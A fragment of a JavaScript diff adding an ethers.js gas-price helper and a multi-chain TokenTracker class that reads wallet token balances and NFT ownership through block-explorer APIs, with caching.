+    if (Date.now() - this.lastUpdate > this.cacheTTL) {
+      this.updateGasPrices().catch(() => {});
+    }
+    return this.currentGasPrice.gt(0) ? this.currentGasPrice : ethers.utils.parseUnits('20', 'gwei');
+  }
+
+  getOptimalGasPrice() {
+    const gasPrice = this.getCurrentGasPrice();
+    return gasPrice.gt(this.maxGasPrice) ? this.maxGasPrice : gasPrice;
+  }
+
+  getGasEstimate(type = 'standard') {
+    const baseGas = this.getCurrentGasPrice();
+    
+    switch (type) {
+      case 'fast':
+        return baseGas.mul(150).div(100);
+      case 'instant':
+        return baseGas.mul(200).div(100);
+      default:
+        return baseGas;
+    }
+  }
+
+  getGasHistory() {
+    return this.gasHistory.map(h => ({
+      timestamp: h.timestamp,
+      gwei: ethers.utils.formatUnits(h.gasPrice, 'gwei'),
+      sources: h.sources
+    }));
+  }
+}
+
+// ======================
+// ENHANCED MULTI-CHAIN TOKEN TRACKER
+// ======================
+class TokenTracker {
+  constructor(providers) {
+    this.providers = providers;
+    this.tokenCache = new Map();
+    this.nftCache = new Map();
+    this.scannerAPIs = CONFIG.SCANNER_APIS;
+    this.scannerKeys = {
+      ethereum: CONFIG.ETHERSCAN_KEY,
+      polygon: CONFIG.POLYGONSCAN_KEY,
+      bsc: CONFIG.BSCSCAN_KEY,
+      arbitrum: CONFIG.ARBISCAN_KEY,
+      optimism: CONFIG.OPTIMISTIC_ETHERSCAN_KEY,
+      avalanche: CONFIG.SNOWTRACE_KEY,
+      fantom: CONFIG.FTMSCAN_KEY,
+      base: CONFIG.BASESCAN_KEY
+    };
+  }
+
+  async getTokensForAddress(walletAddress, chain = 'ethereum') {
+    const cacheKey = `${chain}-${walletAddress}`;
+    
+    if (this.tokenCache.has(cacheKey)) {
+      const cached = this.tokenCache.get(cacheKey);
+      if (Date.now() - cached.timestamp < 60000) { // 1 minute cache
+        return cached.tokens;
+      }
+    }
+
+    const tokens = [];
+    const provider = this.providers[chain];
+    
+    if (!provider) {
+      logger.warn(`No provider available for chain: ${chain}`);
+      return tokens;
+    }
+
+    try {
+      // Method 1: Check known tokens from registry
+      const knownTokens = CONFIG.TOKEN_REGISTRY[chain] || [];
+      for (const tokenInfo of knownTokens) {
+        if (tokenInfo.address === ethers.constants.AddressZero) continue;
+        
+        try {
+          const contract = new ethers.Contract(tokenInfo.address, ERC20_ABI, provider);
+          const balance = await contract.balanceOf(walletAddress);
+          
+          if (balance.gt(0)) {
+            tokens.push({
+              address: tokenInfo.address,
+              symbol: tokenInfo.symbol,
+              decimals: tokenInfo.decimals,
+              balance,
+              name: tokenInfo.symbol,
+              coingeckoId: tokenInfo.coingeckoId
+            });
+          }
+        } catch (error) {
+          logger.debug(`Failed to check token ${tokenInfo.symbol}`, { error: error.message });
+        }
+      }
+
+      // Method 2: Use scanner API if available
+      const scannerKey = this.scannerKeys[chain];
+      const scannerAPI = this.scannerAPIs[chain];
+      
+      if (scannerKey && scannerAPI) {
+        try {
+          const url = `${scannerAPI}?module=account&action=tokentx&address=${walletAddress}&apikey=${scannerKey}&sort=desc`;
+          const response = await axios.get(url, { timeout: 10000 });
+          
+          if (response.data.status === '1' && response.data.result) {
+            const uniqueTokens = new Map();
+            
+            for (const tx of response.data.result.slice(0, 50)) { // Limit to recent 50 transactions
+              if (!uniqueTokens.has(tx.contractAddress)) {
+                uniqueTokens.set(tx.contractAddress, {
+                  address: tx.contractAddress,
+                  symbol: tx.tokenSymbol,
+                  decimals: parseInt(tx.tokenDecimal),
+                  name: tx.tokenName
+                });
+              }
+            }
+
+            // Check balances for discovered tokens
+            for (const [address, tokenInfo] of uniqueTokens) {
+              if (tokens.some(t => t.address.toLowerCase() === address.toLowerCase())) {
+                continue; // Already checked
+              }
+
+              try {
+                const contract = new ethers.Contract(address, ERC20_ABI, provider);
+                const balance = await contract.balanceOf(walletAddress);
+                
+                if (balance.gt(0)) {
+                  tokens.push({
+                    ...tokenInfo,
+                    balance
+                  });
+                }
+              } catch (error) {
+                logger.debug(`Failed to check discovered token ${address}`, { error: error.message });
+              }
+            }
+          }
+        } catch (error) {
+          logger.debug(`Scanner API failed for ${chain}`, { error: error.message });
+        }
+      }
+
+    } catch (error) {
+      logger.error(`Token discovery failed for ${chain}:${walletAddress}`, { error: error.message });
+    }
+
+    // Cache results
+    this.tokenCache.set(cacheKey, {
+      tokens,
+      timestamp: Date.now()
+    });
+
+    return tokens;
+  }
+
+  async getNFTsForAddress(walletAddress, chain = 'ethereum') {
+    const cacheKey = `nft-${chain}-${walletAddress}`;
+    
+    if (this.nftCache.has(cacheKey)) {
+      const cached = this.nftCache.get(cacheKey);
+      if (Date.now() - cached.timestamp < 300000) { // 5 minute cache for NFTs
+        return cached.nfts;
+      }
+    }
+
+    const nfts = [];
+    const provider = this.providers[chain];
+    
+    if (!provider) {
+      logger.warn(`No provider available for chain: ${chain}`);
+      return nfts;
+    }
+
+    try {
+      // Use scanner API for NFT discovery
+      const scannerKey = this.scannerKeys[chain];
+      const scannerAPI = this.scannerAPIs[chain];
+      
+      if (scannerKey && scannerAPI) {
+        try {
+          const url = `${scannerAPI}?module=account&action=tokennfttx&address=${walletAddress}&apikey=${scannerKey}&sort=desc`;
+          const response = await axios.get(url, { timeout: 15000 });
+          
+          if (response.data.status === '1' && response.data.result) {
+            const ownedNFTs = new Map();
+            
+            // Process transactions to determine current ownership
+            for (const tx of response.data.result) {
+              const key = `${tx.contractAddress}-${tx.tokenID}`;
+              
+              if (tx.to.toLowerCase() === walletAddress.toLowerCase()) {
+                ownedNFTs.set(key, {
+                  contract: tx.contractAddress,
+                  tokenId: tx.tokenID,
+                  collection: tx.tokenName || 'Unknown',
+                  symbol: tx.tokenSymbol || '',
+                  lastTx: tx.hash
+                });
+              } else if (tx.from.toLowerCase() === walletAddress.toLowerCase()) {
+                ownedNFTs.delete(key); // NFT was transferred away
+              }
+            }
+
+            // Verify ownership for suspicious cases
+            for (const [key, nft] of ownedNFTs) {
+              try {
+                const contract = new ethers.Contract(nft.contract, ERC721_ABI, provider);
+                const owner = await contract.ownerOf(nft.tokenId);
+                
+                if (owner.toLowerCase() === walletAddress.toLowerCase()) {
+                  nfts.push(nft);
+                }
+              } catch (error) {
+                // Token might not exist or contract might not support ownerOf
+                logger.debug(`Failed to verify NFT ownership`, { 
+                  contract: nft.contract, 
+                  tokenId: nft.tokenId,
+                  error: error.message 
+                });
+              }
+            }
+          }
+        } catch (error) {
+          logger.debug(`NFT scanner API failed for ${chain}`, { error: error.message });
+        }
+      }
+
+    } catch (error) {
+      logger.error(`NFT discovery failed for ${chain}:${walletAddress}`, { error: error.message });
+    }
+
+    // Cache results
+    this.nftCache.set(cacheKey, {
+      nfts,
+      timestamp: Date.now()
+    });
+
+    return nfts;
+  }
+
+  async getERC1155TokensForAddress(walletAddress, chain = 'ethereum') {
+    // ERC1155 token discovery - more complex as it requires contract-specific queries
+    const tokens = [];
+    // Implementation would require specific contract addresses or event logs
+    // This is a placeholder for ERC1155 support
+    return tokens;
+  }
+
+  clearCache(walletAddress = null, chain = null) {
+    if (walletAddress && chain) {
+      this.tokenCache.delete(`${chain}-${walletAddress}`);
+      this.nftCache.delete(`nft-${chain}-${walletAddress}`);
+    } else {
+      this.tokenCache.clear();
+      this.nftCache.clear();
+    }
+  }
+
+  getCacheStats() {
+    return {
+      tokenCache: this.tokenCache.size,
+      nftCache: this.nftCache.size
+    };
+  }
+}
